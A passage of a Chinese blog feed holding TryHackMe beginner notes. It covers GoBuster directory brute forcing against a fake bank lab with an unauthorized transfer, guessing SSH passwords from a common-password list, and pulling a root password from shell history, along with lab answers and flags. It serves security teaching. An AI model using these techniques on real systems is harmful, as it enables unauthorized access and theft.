<p>我们将使用一个名为“GoBuster”的命令行工具来暴力破解 FakeBank 网站以查找隐藏目录或者页面，GoBuster 将使用一个包含潜在的页面名称或目录名称的字典，并尝试将该字典中的每一条记录和初始目标网站的url进行拼接，然后会逐个访问拼接之后的url，如果某个拼接之后的url所对应的网站页面真实存在，我们就能在GoBuster 的输出中得到对应的有效结果。</p>
<p><strong>步骤1）打开终端</strong></p>
<p>终端，也称为命令行，允许我们在不使用图形用户界面的情况下与计算机交互。</p>
<p><strong>步骤2）查找隐藏的网站页面</strong></p>
<p>大多数公司的网站都会有一个管理门户页面，此页面让公司员工能够访问基本的管理控制功能以进行一些日常操作。对于银行而言，员工可能需要将资金转入或者转出客户账户，如果网站页面不设为私有，那么攻击者就可能会找到显示敏感数据的隐藏页面或者允许访问网站管理控件的隐藏页面。</p>
<p>我们将在终端中键入以下命令，以使用 GoBuster（命令行安全工具）查找 FakeBank 网站上可能隐藏的页面。</p>
<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line">gobuster -u http://fakebank.com -w wordlist.txt <span class="built_in">dir</span></span><br></pre></td></tr></table></figure></div>

<p>在上面的命令中，<code>-u</code>选项 将指定我们需要进行扫描的目标网站，<code>-w</code>选项 将指定用于进行遍历的字典以帮助我们查找隐藏页面。</p>
<p>GoBuster 会使用字典中的每条记录来扫描目标网站，从而查找目标网站上可能存在的隐藏页面；最终我们在GoBuster的输出结果中 可以看到目标网站上确实存在的隐藏目录（Status: 200表示相关页面确实存在）。</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/articleimg/image-20230318222340492.png"
                      alt="image-20230318222340492"
                ></p>
<p><strong>步骤3）攻击目标应用程序</strong></p>
<p>你应该已经找到了一个秘密的银行转账页面，这个页面(&#x2F;bank-transfer)允许你在银行账户之间进行转账。</p>
<p>攻击者可以利用隐藏的银行转账页面从任何银行账户中窃取资金，这对银行来说是一个严重的安全风险；作为一名有道德的黑客，你应该（在获得许可的情况下）从目标公司的应用程序中尝试发现此漏洞，并在黑客利用这个漏洞之前将其报告给银行以便进行及时修复。</p>
<p><strong>答题</strong></p>
<p><em>尝试在虚拟实验环境中对目标进行攻击，从银行账户号2276向你的账户（账户号8881）转账 2000美元。</em></p>
<p>在终端界面输入以下命令：</p>
<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line">gobuster -u http://fakebank.com -w wordlist.txt <span class="built_in">dir</span></span><br></pre></td></tr></table></figure></div>

<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/articleimg/image-20230318224310889.png"
                      alt="image-20230318224310889"
                ></p>
<p>访问找到的隐藏目录：</p>
<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/articleimg/image-20230318224411171.png"
                      alt="image-20230318224411171" style="zoom:50%;" 
                >

<p>进行转账操作：</p>
<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/articleimg/image-20230318224527032.png"
                      alt="image-20230318224527032" style="zoom:50%;" 
                >

<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/articleimg/image-20230318224604085.png"
                      alt="image-20230318224604085" style="zoom:50%;" 
                >

<p>返回初始的银行账户页面–查看最终答案：</p>
<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/articleimg/image-20230318224830196.png"
                      alt="image-20230318224830196" style="zoom:50%;" 
                >

<blockquote>
<p>最终显示的答案为：BANK-HACKED</p>
</blockquote>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/articleimg/image-20230318224849820.png"
                      alt="image-20230318224849820"
                ></p>
<h2 id="什么是进攻性安全？"><a href="#什么是进攻性安全？" class="headerlink" title="什么是进攻性安全？"></a>什么是进攻性安全？</h2><p>简而言之，进攻性安全就是尝试闯入目标计算机系统、利用软件本身的错误并找到应用程序中的漏洞以获得对目标的未授权访问的过程。</p>
<p>要打败黑客，你就需要像黑客一样行事，作为合法的网络安全人员，你需要在网络犯罪分子发动攻击之前发现目标系统的漏洞并推荐漏洞补丁。</p>
<p>以下是关于进攻性安全职业角色的简短描述：</p>
<ul>
<li>渗透测试员 - 负责测试技术产品以发现可利用的安全漏洞。</li>
<li>红队 - 扮演对抗者的角色，攻击目标组织并从敌人的角度提供网络安全防护措施反馈。</li>
<li>安全工程师 - 设计、监控和维护安全控制、网络和系统，以帮助防止网络攻击。</li>
</ul>
]]></content>
      <categories>
        <category>TryHackMe笔记</category>
      </categories>
      <tags>
        <tag>TryHackMe</tag>
        <tag>网络安全基础</tag>
      </tags>
  </entry>
  <entry>
    <title>主题样式Demo</title>
    <url>/2024/01/16/hello-world/</url>
    <content><![CDATA[<p>Welcome to <a class="link"   href="https://hexo.io/" >Hexo <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a>! This is your very first post. Check <a class="link"   href="https://hexo.io/docs/" >documentation <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a> for more info. If you get any problems when using Hexo, you can find the answer in <a class="link"   href="https://hexo.io/docs/troubleshooting.html" >troubleshooting <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a> or you can ask me on <a class="link"   href="https://github.com/hexojs/hexo/issues" >GitHub <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a>.</p>
<h2 id="Quick-Start"><a href="#Quick-Start" class="headerlink" title="Quick Start"></a>Quick Start</h2><h3 id="Create-a-new-post"><a href="#Create-a-new-post" class="headerlink" title="Create a new post"></a>Create a new post</h3><div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line">$ hexo new <span class="string">&quot;My New Post&quot;</span></span><br></pre></td></tr></table></figure></div>

<p>More info: <a class="link"   href="https://hexo.io/docs/writing.html" >Writing <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
<h3 id="Run-server"><a href="#Run-server" class="headerlink" title="Run server"></a>Run server</h3><div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line">$ hexo server</span><br></pre></td></tr></table></figure></div>

<p>More info: <a class="link"   href="https://hexo.io/docs/server.html" >Server <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
<h3 id="Generate-static-files"><a href="#Generate-static-files" class="headerlink" title="Generate static files"></a>Generate static files</h3><div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line">$ hexo generate</span><br></pre></td></tr></table></figure></div>

<p>More info: <a class="link"   href="https://hexo.io/docs/generating.html" >Generating <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
<h3 id="Deploy-to-remote-sites"><a href="#Deploy-to-remote-sites" class="headerlink" title="Deploy to remote sites"></a>Deploy to remote sites</h3><div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line">$ hexo deploy</span><br></pre></td></tr></table></figure></div>

<p>More info: <a class="link"   href="https://hexo.io/docs/one-command-deployment.html" >Deployment <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
]]></content>
  </entry>
  <entry>
    <title>THM-Operating System Security(操作系统安全介绍)-学习</title>
    <url>/2024/01/16/THM-Operating%20System%20Security(%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%E5%AE%89%E5%85%A8%E4%BB%8B%E7%BB%8D)-%E5%AD%A6%E4%B9%A0/</url>
    <content><![CDATA[<p>本文相关的TryHackMe实验房间链接：<a class="link"   href="https://tryhackme.com/room/operatingsystemsecurity" >https://tryhackme.com/room/operatingsystemsecurity <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
<p>本文相关内容：简单介绍操作系统安全，并演示 Linux系统 上的 SSH 身份验证实例。</p>
<h2 id="操作系统安全简介"><a href="#操作系统安全简介" class="headerlink" title="操作系统安全简介"></a>操作系统安全简介</h2><p>每天当你使用智能手机或者笔记本电脑以及其他任何类型的计算机时，你都会直接或间接地与操作系统进行交互；常用的操作系统包括 MS Windows、macOS、iOS、Android、Chrome OS 和 Linux。</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/articleimg/41f5388e5280b8a769158537e4372eae.png"
                      alt="img"
                ></p>
<p>什么是操作系统？ 要定义操作系统，我们首先需要知道一个计算机术语：硬件。</p>
<p>计算机硬件是指所有可以用手触摸到的计算机部件和外围设备。硬件包括屏幕、键盘、打印机、U盘和主板；其中主板包含了许多组件，特别是中央处理器（CPU）和内存芯片（RAM），主板通常会连接存储设备（HDD-机械硬盘 或 SSD-固态硬盘）。</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/articleimg/image-20230322012635473.png"
                      alt="image-20230322012635473"
                ></p>
<p>主板是计算机的关键部分，从键盘和鼠标到屏幕和打印机的所有其他硬件都将连接到计算机主板；但是，如果你想在计算机中运行自己喜欢的程序或者应用程序，硬件组件本身是没办法直接被使用的，所以我们需要一个操作系统来控制和“驱动”这些硬件组件。</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/articleimg/image-20230322013136875.png"
                      alt="image-20230322013136875"
                ></p>
<p>操作系统 (OS) 是位于硬件与你正在运行的应用程序或者程序之间的层。</p>
<p>你日常使用的示例程序可能包括网络浏览器，例如 Firefox、Safari 和 Chrome，以及消息传递应用程序，例如 Signal、WhatsApp 和 Telegram。所有的程序和应用程序都不能直接在计算机硬件上运行，但是，它们能够运行在操作系统上，操作系统能够允许程序按照特定的规则去访问硬件。</p>
<p>某些操作系统专为在笔记本电脑和个人台式机上运行而设计，例如 MS Windows 11 和 macOS；还有某些操作系统专为智能手机而设计，例如 Android 和 iOS；另外还有用于服务器的操作系统，例如 <a class="link"   href="https://www.microsoft.com/en-us/windows-server/" >MS Windows Server 2022 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a>、<a class="link"   href="https://www.ibm.com/products/aix" >IBM AIX <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a> 和 <a class="link"   href="https://www.oracle.com/solaris" >Oracle Solaris <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a>；最后，还有一些在个人计算机上以及在服务器上都能被使用的操作系统，比如Linux。</p>
<p>下图是2022 年 1 月期间收集的数据，这些数据显示了当时 用于浏览互联网的不同操作系统的流行程度。</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/articleimg/image-20230322014002536.png"
                      alt="image-20230322014002536"
                ></p>
<p>你的智能手机可能运行在 Android 或 iOS操作系统上，并且其中可能拥有关于你的大量私人数据，包括：</p>
<ol>
<li>与家人和朋友的私人谈话</li>
<li>与家人和朋友的私人照片</li>
<li>你用于个人和工作通信的电子邮件客户端</li>
<li>保存在网络浏览器中密码（甚至保存在笔记中的密码）</li>
<li>电子银行应用程序</li>
</ol>
<p>关于机密和私人数据的清单可能还有更多内容，你应该不会希望你所不信任的人打开你的手机并浏览你的照片、对话和应用程序；因此，你需要保护好自己的手机及其操作系统的安全。</p>
<p>保护私人数据同样适用于 运行了 MS Windows、macOS、Linux 等操作系统的笔记本电脑或计算机，你的计算机中很可能包含了大量信息，例如：</p>
<ol>
<li>与你的工作或大学相关的机密文件</li>
<li>你的私人个人文件，例如你的身份证或护照复印件</li>
<li>你所使用的电子邮件程序，例如 MS Outlook、Mozilla Thunderbird等</li>
<li>你保存在网络浏览器和其他应用程序中的密码</li>
<li>你的数码相机和智能手机中的照片的复印件</li>
</ol>
<p>这些关于私人信息的列表可能会很长，具体内容取决于用户类型。</p>
<p>考虑到所保存的数据的性质，你肯定会希望能够尽量确保个人信息安全，而当我们谈论到信息安全时，我们应该想到要保护好以下几点：</p>
<ul>
<li>机密性(Confidentiality)：你希望确保 机密的和私人的文件、信息仅供指定人员使用。</li>
<li>完整性(Integrity)：任何人都不能篡改存储在你的系统上的文件 或者 篡改你在网络上传输的文件。</li>
<li>可用性(Availability)：你希望你的笔记本电脑或智能手机在你决定使用时能够随时处于可用状态。</li>
</ul>
<p>tips：Confidentiality、Integrity、Availability——即CIA三合一模型。</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/articleimg/image-20230322015625614.png"
                      alt="image-20230322015625614"
                ></p>
<p><strong>答题</strong></p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/articleimg/image-20230320213504737.png"
                      alt="image-20230320213504737"
                ></p>
<h2 id="关于操作系统安全的常见示例"><a href="#关于操作系统安全的常见示例" class="headerlink" title="关于操作系统安全的常见示例"></a>关于操作系统安全的常见示例</h2><p>正如我们在上一小节中所提到的，操作系统安全将涉及针对以下几个方面的攻击：</p>
<ul>
<li>Confidentiality-机密性</li>
<li>Integrity-完整性</li>
<li>Availability-可用性</li>
</ul>
<p>在本小节，我们将重点关注恶意用户所针对的三个安全缺陷：</p>
<ol>
<li>身份验证中的弱密码</li>
<li>弱文件权限</li>
<li>恶意程序</li>
</ol>
<h3 id="身份验证中的弱密码"><a href="#身份验证中的弱密码" class="headerlink" title="身份验证中的弱密码"></a>身份验证中的弱密码</h3><p>身份验证是验证你身份的行为，无论是本地系统还是远程系统，身份验证可以通过三种主要方式实现：</p>
<ul>
<li>你知道的信息，例如密码或 PIN 码。</li>
<li>你是什么，例如指纹。</li>
<li>你拥有的东西，例如可以接收 SMS(短信服务) 消息的电话号码。</li>
</ul>
<p>由于密码是最常见的身份验证形式，因此它们也是最容易受到攻击的。许多用户倾向于在网站上使用容易猜到的简单密码 或者 在多个网站上使用相同的密码；此外，一些用户是设置密码时 会依赖个人详细信息，例如出生日期和宠物的名字等，他们认为这很容易记忆并且不会被攻击者知道（事实上攻击者已经意识到了：用户在设置密码时，会倾向于依赖个人详细信息）。</p>
<p>2019 年 4 月 21 日 英国国家网络安全中心 (NCSC) 发布了 <a class="link"   href="https://www.ncsc.gov.uk/blog-post/passwords-passwords-everywhere" >100,000 个最常用密码 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a>的列表，让我们看看常用的前 20 个密码(Top20)。</p>
<div class="highlight-container" data-rel="Shell"><figure class="iseeu highlight shell"><table><tr><td class="code"><pre><span class="line">Rank	          Password</span><br><span class="line">1	              123456</span><br><span class="line">2	              123456789</span><br><span class="line">3	              qwerty</span><br><span class="line">4	              password</span><br><span class="line">5	              111111</span><br><span class="line">6	              12345678</span><br><span class="line">7	              abc123</span><br><span class="line">8	              1234567</span><br><span class="line">9	              password1</span><br><span class="line">10	              12345</span><br><span class="line">11	              1234567890</span><br><span class="line">12	              123123</span><br><span class="line">13	              000000</span><br><span class="line">14	              iloveyou</span><br><span class="line">15	              1234</span><br><span class="line">16	              1q2w3e4r5t</span><br><span class="line">17	              qwertyuiop</span><br><span class="line">18	              123</span><br><span class="line">19	              monkey</span><br><span class="line">20	              dragon</span><br></pre></td></tr></table></figure></div>

<p>阅读以上Top20密码列表：我们可以看到 123、1234、12345、…、123456789 和 1234567890 都在列表中，password、iloveyou、monkey、dragon等也是常用的英文，而在英文字典中没有的无含义词包括 qwerty、qwertyuiop 和 1q2w3e4r5t，这些看似复杂的(无含义词)密码 其实也非常容易预测，因为它们是遵循键盘布局进行输入的。</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/articleimg/1510e4bd81418a2937060f9c55dad593.gif"
                      alt="img"
                ></p>
<p>简而言之，如果攻击者可以猜出你的任何在线帐户（例如你的电子邮件或社交媒体帐户）的密码，他们将能够直接访问你的私人数据。 因此，选择复杂的密码，并且在不同的账户下使用不同的密码是至关重要的。</p>
<h3 id="弱文件权限"><a href="#弱文件权限" class="headerlink" title="弱文件权限"></a>弱文件权限</h3><p>适当的安全性决定了最小特权原则。在工作环境中，你希望任何文件都只有那些需要访问它才能完成工作的人 有权进行访问；在个人层面上，假设你计划与家人或朋友一起去旅行，你可能只希望与参加该旅行的人共享与旅行计划相关的所有文件，而不想直接公开让所有人共享此类文件——这就是最小特权原则。简而言之，最小特权原则是指：我们要确定“谁才可以访问什么？”。</p>
<p>弱文件权限会使攻击者很容易针对机密性和完整性进行攻击：攻击者可以攻击机密性，因为弱权限允许他们访问他们不应该访问的文件；攻击者也可以攻击完整性，因为他们能够修改他们不应该进行编辑的文件。</p>
<h3 id="恶意程序"><a href="#恶意程序" class="headerlink" title="恶意程序"></a>恶意程序</h3><p>我们要举的最后一个例子是恶意程序，根据恶意程序的类型，它们可以针对机密性、完整性和可用性进行攻击。</p>
<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/articleimg/f0a69acdee2506b2898e34fc231fe94b.png"
                      alt="img" style="zoom:50%;" 
                >

<p>某些类型的恶意程序（例如特洛伊木马）允许攻击者访问你的系统，因此，攻击者将能够读取你的文件甚至修改你的文件。</p>
<p>某些类型的恶意程序会针对可用性进行攻击，例如勒索软件(ransomware)。勒索软件是一种能够加密用户文件的恶意程序，加密能够使文件在不知道加密密码的情况下变得不可读，换句话说，文件在没有进行解密（逆向加密）的情况下会变成乱码。在勒索软件事件中，攻击者往往会为用户提供恢复文件可用性的方法，攻击者会让用户重新获得对其原始文件的访问权限：当用户愿意支付“赎金-ransom”时，攻击者则会向用户提供加密密码以进行解密。</p>
<p><strong>答题</strong></p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/articleimg/image-20230320213351214.png"
                      alt="image-20230320213351214"
                ></p>
<h2 id="关于操作系统安全的简单实例"><a href="#关于操作系统安全的简单实例" class="headerlink" title="关于操作系统安全的简单实例"></a>关于操作系统安全的简单实例</h2><p>在典型的网络攻击中，攻击者可能会试图获得对远程目标系统的访问权，我们可以通过诱使目标运行恶意文件或者通过直接获取用户名、密码来完成此类攻击。</p>
<p>在本小节我们将重点关注：通过获取用户名、密码来获得对远程目标系统的访问权。 在发现有效用户名后，我们往往可以尝试“猜测”对应的密码，此外，我们也将进一步尝试将权限提升到系统管理员。</p>
<p>系统管理员账号身份在安卓、苹果、Linux系统上被称为<strong>root</strong>，而在 MS Windows 系统上，管理员账号身份会被称为<strong>administrator</strong>，root 账户和administrator 账户对目标系统都具有完全不受限制的访问权限。</p>
<p>在本小节中，我们将使用Linux系统进行练习，我们将可能使用以下 Linux 命令：</p>
<ul>
<li><code>whoami</code></li>
<li><code>ssh USERNAME@MACHINE_IP</code></li>
<li><code>ls</code></li>
<li><code>cat FILENAME</code></li>
<li><code>history</code></li>
</ul>
<p><strong>模拟场景</strong>：</p>
<p>我们受雇检查某家公司的安全性，当我们查看客户的办公室环境时，我们注意到其中一个桌子上有留有一张便条，上面有两个词：sammie 和 dragon，让我们猜测一下 dragon 是不是 Sammie用户 在目标机器 (MACHINE_IP)上所使用的密码？在 AttackBox 的终端中，我们将尝试通过执行<code>ssh sammie@MACHINE_IP</code>命令来登录到 Sammie 的ssh帐户，远程目标系统会要求你提供 sammie 的密码——我们输入 dragon 进行尝试。</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/articleimg/image-20230322173552863.png"
                      alt="image-20230322173552863"
                ></p>
<p>AttackBox 终端上的登录交互如下所示：</p>
<div class="highlight-container" data-rel="Shell"><figure class="iseeu highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_">user@AttackBox# </span><span class="language-bash">ssh sammie@MACHINE_IP</span></span><br><span class="line">sammie@MACHINE_IP&#x27;s password: </span><br><span class="line">Welcome to Ubuntu 20.04.4 LTS (GNU/Linux 5.4.0-100-generic x86_64)</span><br><span class="line"></span><br><span class="line"> * Documentation:  https://help.ubuntu.com</span><br><span class="line"> * Management:     https://landscape.canonical.com</span><br><span class="line"> * Support:        https://ubuntu.com/advantage</span><br><span class="line"></span><br><span class="line">  System information as of Tue  1 Mar 13:20:32 UTC 2022</span><br><span class="line"></span><br><span class="line">  System load:  0.03              Processes:              216</span><br><span class="line">  Usage of /:   51.8% of 6.53GB   Users logged in:        1</span><br><span class="line">  Memory usage: 17%               IPv4 address for ens33: MACHINE_IP</span><br><span class="line">  Swap usage:   0%</span><br><span class="line"></span><br><span class="line"> * Super-optimized for small spaces - read how we shrank the memory</span><br><span class="line">   footprint of MicroK8s to make it the smallest full K8s around.</span><br><span class="line"></span><br><span class="line">   https://ubuntu.com/blog/microk8s-memory-optimisation</span><br><span class="line"></span><br><span class="line">0 updates can be applied immediately.</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Last login: Tue Mar  1 09:46:11 2022 from MACHINE_IP</span><br></pre></td></tr></table></figure></div>

<p>成功通过ssh完成登录后，我们可以使用<code>whoami</code>命令 来验证当前用户身份是否为–sammie；我们可以使用 <code>ls</code>(list 的缩写)命令 来列出当前目录中的文件，此命令将显示出当前目录中的所有文件，但隐藏文件并不会显示；如果要显示任何文本文件的内容，我们可以使用命令 <code>cat FILENAME</code>，cat是concatenate 的缩写，此命令将在终端屏幕上打印出文本文件的内容。</p>
<p>在下面的终端交互中，我们看到了四个命令的使用情况：<code>ssh</code>、<code>whoami</code>、<code>ls</code> 和 <code>cat</code> 。</p>
<div class="highlight-container" data-rel="Shell"><figure class="iseeu highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_">user@AttackBox# </span><span class="language-bash">ssh sammie@10.20.30.130</span></span><br><span class="line">sammie@10.20.30.130&#x27;s password: </span><br><span class="line">Welcome to Ubuntu 20.04.4 LTS (GNU/Linux 5.4.0-100-generic x86_64)</span><br><span class="line"></span><br><span class="line">[...]</span><br><span class="line"></span><br><span class="line">Last login: Tue Mar  1 14:45:53 2022 from 10.20.30.1</span><br><span class="line">sammie@beginner-os-security:~$ whoami</span><br><span class="line">sammie</span><br><span class="line">sammie@beginner-os-security:~$ ls</span><br><span class="line">country.txt  draft.md  icon.png  password.txt  profile.jpg</span><br><span class="line">sammie@beginner-os-security:~$ cat draft.md </span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">Operating System Security</span></span><br><span class="line"></span><br><span class="line">Reusing passwords means that your password for other sites becomes exposed if one service is hacked.</span><br><span class="line">sammie@beginner-os-security:~$</span><br></pre></td></tr></table></figure></div>

<p>接下来，我们将介绍的最后一个命令是 <code>history</code>，此命令将在终端界面打印出用户曾经使用的命令；当你使用<code>history</code>命令之后，也许能在终端输出结果中找到一些敏感信息。</p>
<p>假设我们已经知道了另外两个可以访问目标机器的用户名：</p>
<ul>
<li><em><strong>johnny</strong></em></li>
<li><em><strong>linda</strong></em></li>
</ul>
<p>如果以上两个用户都很少考虑安全性，我们可以使用多种方式来猜测这两个用户的密码，此处我们将列出以下两种情况：</p>
<ul>
<li>如果你未以 sammie用户 或任何其他用户身份完成ssh登录操作，你可以直接使用 <code>ssh johnny@MACHINE_IP</code>命令并手动尝试输入多个密码进行猜测，以查看哪个密码对 johnny用户 有效。</li>
<li>如果你已经以 sammie用户 或任何其他用户身份完成了ssh登录操作，你可以使用 <code>su - johnny</code>命令 来切换用户身份，并手动尝试输入一个又一个密码，以查看哪个密码对 johnny用户 有效。</li>
</ul>
<p><strong>答题</strong></p>
<p><em>在本文相关的Tryhackme实验房间页面 部署虚拟实验环境，并完成本小节对应的实例。</em></p>
<p><em><strong>问题：</strong></em></p>
<ol>
<li>根据本文所介绍的Top 7 常用密码，让我们尝试找出 Johnny 的密码，用户 johnny 的密码是什么？</li>
<li>以 Johnny 身份登录后，使用<code>history</code>命令检查 Johnny 曾经键入过的命令，我们发现Johnny错误地把 root 密码当成命令输入过，root密码的内容是什么？</li>
<li>以 Johnny 身份登录后，使用命令 <code>su - root</code> 切换到 root 帐户(并输入root密码通过身份验证)，查看根目录下的flag.txt的内容，flag.txt的内容是什么？</li>
</ol>
<p><em><strong>操作：</strong></em></p>
<p>我们可以使用以下命令针对目标机器进行ssh登录尝试：</p>
<div class="highlight-container" data-rel="Shell"><figure class="iseeu highlight shell"><table><tr><td class="code"><pre><span class="line">ssh johnny@10.10.210.242</span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">经过登录尝试发现可用密码：abc123</span></span><br></pre></td></tr></table></figure></div>

<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/articleimg/image-20230322181721434.png"
                      alt="image-20230322181721434"
                ></p>
<blockquote>
<p>用户 johnny 的密码是：abc123</p>
</blockquote>
<p>成功完成ssh登录后，输入<code>history</code>命令：发现root用户的密码。</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/articleimg/image-20230322181911146.png"
                      alt="image-20230322181911146"
                ></p>
<blockquote>
<p>root用户的密码为：happyHack!NG 。</p>
</blockquote>
<p>切换用户身份到root（使用我们刚才找到的密码完成身份验证），以root用户身份查找flag.txt文件 并获取其文本内容：</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/articleimg/image-20230322182319042.png"
                      alt="image-20230322182319042"
                ></p>
<blockquote>
<p>flag.txt的内容是：THM{YouGotRoot} 。</p>
</blockquote>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/articleimg/image-20230320214350583.png"
                      alt="image-20230320214350583"
                ></p>
]]></content>
      <categories>
        <category>TryHackMe笔记</category>
      </categories>
      <tags>
        <tag>TryHackMe</tag>
        <tag>网络安全基础</tag>
      </tags>
  </entry>
  <entry>
    <title>THM-Web Application Security(Web应用程序安全介绍)-学习</title>
    <url>/2024/01/16/THM-Web%20Application%20Security(Web%E5%BA%94%E7%94%A8%E7%A8%8B%E5%BA%8F%E5%AE%89%E5%85%A8%E4%BB%8B%E7%BB%8D)-%E5%AD%A6%E4%B9%A0/</url>
    <content><![CDATA[<p>本文相关的TryHackMe实验房间链接：<a class="link"   href="https://tryhackme.com/room/introwebapplicationsecurity" >https://tryhackme.com/room/introwebapplicationsecurity <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
<p>本文相关内容：了解 Web 应用程序并探索它们的一些常见安全问题</p>
<h2 id="Web应用程序简介"><a href="#Web应用程序简介" class="headerlink" title="Web应用程序简介"></a>Web应用程序简介</h2><p>我们每个人都会在我们的计算机上使用不同的程序。 一般来说，当程序在计算机上运行时，就将使用计算机的处理能力和存储功能，而且，要使用一个程序，我们还需要先安装它。如果我们想不经过安装操作就直接使用程序应该怎么办？</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/articleimg/image-20230421124001893.png"
                      alt="image-20230421124001893"
                ></p>
<p>Web 应用程序类似于普通的“程序”，并且只要我们的计算机上有一个现代的、标准的 Web 浏览器，例如 Firefox、Safari 或 Chrome等，我们就可以不经安装而直接使用Web应用程序——当我们想运行Web应用程序时，我们无需安装 运行时所需的每个程序，只需直接访问相关浏览器页面即可。 </p>
<p>以下是关于 Web 应用程序的一些示例：</p>
<ul>
<li>网络邮件，例如 Tutanota、Protonmail、Outlook 和 Gmail</li>
<li>在线办公套件，如 Microsoft Office 365（Word、Excel 和 PowerPoint）、Google Drive（Docs、Sheets 和 Slides）和 Zoho Office（Writer、Sheet 和 Show）</li>
<li>在线购物网站，例如 Amazon.com、AliExpress 和 Etsy</li>
</ul>
<p>其他示例还包括网上银行、汇款、天气预报和网络社交媒体等，成千上万的Web应用程序提供了数不胜数的在线服务。</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/articleimg/image-20230421124018938.png"
                      alt="image-20230421124018938"
                ></p>
<p>Web 应用程序的概念是一个在远程服务器上运行的程序，而服务器是指连续运行以“服务”用户客户端的计算机系统，在这种情况下，服务器将运行特定类型的程序，并且这些程序可以通过Web浏览器被访问。</p>
<p>以一个在线购物 Web 应用程序为例，此 Web 应用程序将从数据库服务器中读取有关产品及其详细信息的数据，数据库将用于 以有组织的方式存储信息，在本例中这些数据可能会包括有关产品、客户和发票的信息。（数据库服务器会负责许多功能，包括对数据库进行读取、搜索和写入等操作） </p>
<p>一个在线购物 Web 应用程序在运行时 可能需要访问多个数据库，例如：</p>
<ul>
<li>产品数据库：该数据库包含有关产品的详细信息，例如名称、图像、规格和价格。</li>
<li>客户数据库：该数据库包含与客户相关的所有详细信息，例如姓名、地址、电子邮件和电话号码。</li>
<li>销售数据库：我们希望在这个数据库中看到每个客户购买了什么以及他们是如何支付的。</li>
</ul>
<p>我们已经大概了解了存储在任何在线购物系统中的信息量，假如攻击者设法利用（破解）Web 应用程序并窃取客户的数据库内容，那么这将给公司及相关客户带来重大损失。</p>
<p>下图显示了在Online购物网站上搜索商品可能将发生什么，在最简单的Online购物网站中，搜索商品可能会经历以下四个步骤：</p>
<ol>
<li><p>用户在搜索字段中输入项目名称或相关关键字，Web 浏览器会将被搜索的关键字发送给在线购物 Web 应用程序。</p>
</li>
<li><p>Web 应用程序查询（搜索）产品数据库以查找用户所提交的关键字。</p>
</li>
<li><p>产品数据库将与用户提供的关键字相匹配的搜索结果返回给 Web 应用程序。</p>
</li>
<li><p>Web 应用程序将结果格式化为友好可读的网页页面并将它们返回给用户以供浏览。</p>
</li>
</ol>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/articleimg/image-20230319224615610.png"
                      alt="image-20230319224615610"
                ></p>
<p>从用户的角度来看，他们只会访问到一个隐藏所有技术基础设施的在线商店页面。</p>
<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/articleimg/image-20230319224808863.png"
                      alt="image-20230319224808863" style="zoom: 67%;" 
                >

<p><strong>答题</strong></p>
<blockquote>
<p>Browser - 浏览器</p>
</blockquote>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/articleimg/image-20230319213257215.png"
                      alt="image-20230319213257215"
                ></p>
<h2 id="Web-应用程序常见安全风险"><a href="#Web-应用程序常见安全风险" class="headerlink" title="Web 应用程序常见安全风险"></a>Web 应用程序常见安全风险</h2><p>假设你想从网上商店购买商品，你就会希望能够在相关 Web 应用程序上执行某些功能，用户完成一个在线商品订单可能分为以下几个步骤：</p>
<p><img  
